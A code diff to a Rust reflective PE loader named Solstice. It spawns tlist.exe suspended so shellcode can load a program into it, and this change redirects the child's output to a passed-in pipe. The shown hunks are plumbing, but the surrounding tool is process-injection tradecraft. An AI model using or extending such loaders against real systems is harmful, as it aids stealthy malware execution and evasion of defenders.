@@ -1,6 +1,7 @@
 use crate::assets::PE_LOADER_SC;
 use crate::error::Error;
 use log::info;
+use std::io::PipeWriter;
 use std::mem::size_of;
 use std::os::windows::io::AsRawHandle;
 use std::os::windows::process::CommandExt;
@@ -24,6 +25,7 @@ pub fn solstice_reflective_load_pe(
     path: &str,
     args: &[String],
     working_dir: &str,
+    writer: PipeWriter,
 ) -> Result<Child, Error> {
     info!(
         "[Solstice] Reflective loading PE: {path} with args {args:?} in {working_dir}"
@@ -44,7 +46,7 @@ pub fn solstice_reflective_load_pe(
     info!("Shellcode size: {shellcode_size} bytes");
 
     // Spawn the target process in suspended state (we don't want it's main thread to run)
-    let child = spawn_target_process(working_dir)?;
+    let child = spawn_target_process(working_dir, writer)?;
     let process_handle = HANDLE(child.as_raw_handle() as isize);
 
     info!("Target process spawned with handle: {process_handle:?}");
@@ -262,7 +264,7 @@ pub fn solstice_reflective_load_pe(
     Ok(child)
 }
 
-fn spawn_target_process(working_dir: &str) -> Result<Child, Error> {
+fn spawn_target_process(working_dir: &str, writer: PipeWriter) -> Result<Child, Error> {
     let process_name = "C:\\Windows\\System32\\tlist.exe";
 
     let mut cmd = Command::new(process_name);
@@ -270,8 +272,8 @@ fn spawn_target_process(working_dir: &str) -> Result<Child, Error> {
         .current_dir(working_dir)
         .creation_flags(CREATE_SUSPENDED.0)
         .stdin(Stdio::null())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
+        .stdout(writer.try_clone().unwrap())
+        .stderr(writer.try_clone().unwrap())
         .spawn()
         .map_err(|e| Error::ProcessCreation(e.to_string()))?;
 
